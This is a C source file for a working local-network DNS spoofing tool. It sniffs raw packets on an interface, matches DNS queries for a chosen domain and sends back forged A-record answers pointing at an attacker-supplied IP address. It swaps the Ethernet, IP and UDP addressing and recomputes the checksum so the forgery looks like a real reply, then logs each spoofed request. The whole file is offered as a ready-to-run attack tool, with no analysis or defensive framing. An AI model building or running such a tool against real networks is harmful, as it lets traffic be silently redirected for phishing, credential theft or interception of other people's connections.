//# https://www.rfc-editor.org/rfc/rfc1035
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdbool.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <sys/ioctl.h>

/// Size of the packet to spoof
// ipv4 = 64kib
#define BUFFER_SIZE 65536

#define DNS_PORT 53
//& 2.3.4. Size limits
//& labels 63 octets or less 
#define DNS_LABEL_SIZE 63
//& names 255 octets or less
#define DNS_NAME_SIZE 255
//@ derived from the DNS_NAME_SIZE 
#define DOMAIN_NAME_SIZE 253


#define IP_HLEN(iphdr) ((iphdr)->ihl * 4)

//& 4.1.1. Header section format
struct dnshdr
{
    uint16_t id;
    uint16_t flags;
    // Question count
    uint16_t qdcount;
    // Answers count
    uint16_t ancount; 
    /* undeeded */
    uint16_t nscount;
    uint16_t arcount;
};

//& 4.1.2. Question section format
//@ No alignment for it to be a wrapper around the buffer
struct __attribute__((packed)) dns_q
{
    char* name;
    uint16_t type;
    uint16_t qclass;
};

struct __attribute__((packed)) dns_a
{
    /// uint8_t *name; <- For the simplicity we're gonna use:
    //& 4.1.4. Message compression
    // and set manually a pointer for this field
    uint16_t type;
    uint16_t aclass;
    uint32_t ttl;
    /// Length of the resource data
    uint16_t rdlength;
    //& a variable length string of octets that describes the resource.
    /// so we write it manually
    // unsigned char *rdata;
};


int create_socket(const struct ifreq *interface)
{
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0)
    {
        perror("Failed to create socket descriptor\n");
        return -1;
    }

    if (setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, interface, sizeof(struct ifreq)) < 0)
    {
        perror("Failed to bind socket to interface\n");
        return -1;
    }

    return sock;
}

size_t domain_to_qname(const char *domain, size_t domain_len, char *qname)
{
    const char *p = domain;
    char *q = qname;
    while (*p) {
        size_t len = strcspn(p, ".");
        
        if (len > DNS_LABEL_SIZE)
            return 0;

        *(q++) = (char)len;
        memcpy(q, p, len);

        q += len;
        p += len;
        if (*p == '.') p++;
    }

    *(q++) = 0;
    return q - qname;
}

//# https://www.rfc-editor.org/rfc/rfc1071
uint16_t csum(const uint16_t* buf, uint16_t count)
{
    uint32_t sum = 0;
    while (count > 1) {
        sum += *buf++;
        count -= 2;
    }
    //if any bytes left, pad the bytes and add
    if(count > 0) {
        sum += (*buf) & htons(0xFF00);
    }
    //Fold sum to 16 bits
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }

    return (uint16_t)(~sum);
}

/*
 * The buffer should be big enough to append a dns answer to it
 * The len will be updated with the new packet size
 * @request_id[out] - the dns request id
 * @return size of the modified buffer, or 0 on failure
 */
size_t process_dns_packet(uint8_t *buffer, size_t buffer_len,
                          const char *qname, size_t qname_len,
                          in_addr_t ip, uint16_t *request_id)
{
    struct ethhdr *eth_header = (struct ethhdr*)buffer;
    struct iphdr *ip_header = (struct iphdr*)((void*)eth_header + ETH_HLEN);
    // Needs UDP
    if (ip_header->protocol != IPPROTO_UDP) {
        return 0;
    }

    struct udphdr *udp_header = (struct udphdr*)((void*)ip_header + IP_HLEN(ip_header));

    // Needs DNS 
    if (ntohs(udp_header->dest) != DNS_PORT) {
         return 0; 
    }

    struct dnshdr *dns_header = (struct dnshdr*)((void*)udp_header + sizeof(struct udphdr));
    uint8_t *dns_body = (uint8_t*)((void*)dns_header + sizeof(struct dnshdr));

    //? Multiple questions in a query is quite uncommon
    // Assuming only one question in body
    /// Check the required qname
    if (strncmp((char*)dns_body, qname, qname_len)) {
       return 0; 
    }
    
    *(request_id) = ntohs(dns_header->id); 

    /// Construct the response
    // set the response bit
    dns_header->flags = htons(1 << 15 | 1 << 10);
    dns_header->ancount = htons(1);

    /// Append a response to the end of the packet
    // write the C0 0C value, which is a pointer(C0) to the qname at offset(0C = size(dns_hdr))
    // dns_a->name
    buffer[buffer_len] = 0xC0;
    buffer[buffer_len + 1] = 0x0C;
    // rest of the structure
    struct dns_a *dns_answer = (struct dns_a*)(buffer + buffer_len + 2);

    // A - host address
    dns_answer->type = htons(1);
    // IN - the Internet
    dns_answer->aclass = htons(1);
    // set it to an hour
    dns_answer->ttl = htonl(3600);
    // length of an ipv4 address
    dns_answer->rdlength = htons(sizeof(in_addr_t));

    /// dns_a->rdata
    // add the ipv4 address at the end of dns_a
    *(in_addr_t*)((void*)dns_answer + sizeof(struct dns_a)) = ip;
    // update the size
    buffer_len += 2 + sizeof(struct dns_a) + sizeof(in_addr_t);

    // update the rest of the packet
    uint8_t mac_p[ETH_ALEN];
    memcpy(mac_p, eth_header->h_source, ETH_ALEN);
    memcpy(eth_header->h_source, eth_header->h_dest, ETH_ALEN);
    memcpy(eth_header->h_dest, mac_p, ETH_ALEN);

    // swap with xor
    ip_header->saddr = ip_header->saddr ^ ip_header->daddr;
    ip_header->daddr = ip_header->saddr ^ ip_header->daddr;
    ip_header->saddr = ip_header->saddr ^ ip_header->daddr;
    ip_header->tot_len = htons(buffer_len - sizeof(struct ethhdr));
    // recompute the checksum
    ip_header->check = 0;
    ip_header->check = csum((uint16_t*)ip_header, ip_header->ihl << 2);

    udp_header->dest = udp_header->source;
    udp_header->source = htons(DNS_PORT);
    udp_header->len = htons(buffer_len - sizeof(struct ethhdr) - sizeof(struct iphdr));
    udp_header->check = 0;

   return buffer_len;
}

size_t read_packet(int sock, uint8_t *buffer)
{
    struct sockaddr saddr;
    socklen_t saddr_len = sizeof(saddr);

    size_t buffer_len = 0;
    if ((buffer_len = recvfrom(sock, buffer, BUFFER_SIZE, 0, &saddr, &saddr_len)) < 0)
    {
        perror("Failed to read from socket \n");
        return 0;
    }
    
    return buffer_len;
}

/*
* Wrapper over sendto..
*/
ssize_t send_packet(int sock, struct sockaddr_ll sock_addr, uint8_t* buffer, size_t buffer_len)
{
    // set the destination
    memcpy(sock_addr.sll_addr, ((struct ethhdr*)buffer)->h_dest, ETH_ALEN);
    return sendto(sock, buffer, buffer_len, 0, (struct sockaddr*)&sock_addr, sizeof(struct sockaddr_ll));
}

int main(const int argc, char *argv[])
{
    if (argc < 4) {
        fprintf(stdout, "Usage: %s <interface> <domain> <resolved_ip>", argv[0]);
        return -1;
    }

    char *if_name = argv[1];
    size_t if_len = strnlen(if_name, IFNAMSIZ);
    char *domain = argv[2];
    char *resolved_ip = argv[3];
    size_t domain_len = strnlen(domain, DOMAIN_NAME_SIZE);

    char qname[256] = {0};
    size_t q_len = domain_to_qname(domain, domain_len, qname);
    in_addr_t ip = inet_addr(resolved_ip);

    struct ifreq interface;
    strncpy(interface.ifr_ifrn.ifrn_name, if_name, if_len);

    int sockfd = create_socket(&interface);
    if (ioctl(sockfd, SIOCGIFINDEX, &interface) < 0)
    {
        perror("Failed to retrieve interface index with ioctl");
        close(sockfd);
        return -1;
    }

    uint8_t buffer[BUFFER_SIZE];
    int buffer_len = 0;

    struct sockaddr_ll sock_addr = {
        .sll_ifindex = interface.ifr_ifindex,
        .sll_halen = ETH_ALEN,
    };

    uint16_t rq_id = 0;
    while (true)
    {
        if (!(buffer_len = read_packet(sockfd, buffer))) {
            break;
        }

        if (!(buffer_len = process_dns_packet(buffer, buffer_len, qname, q_len, ip, &rq_id))) {
            continue;
        }            
        
        if (send_packet(sockfd, sock_addr, buffer, buffer_len) > 0) {
            fprintf(stdout, "0x%04X spoofed\n", rq_id);
        }
     }

    close(sockfd);
    return 0;
}
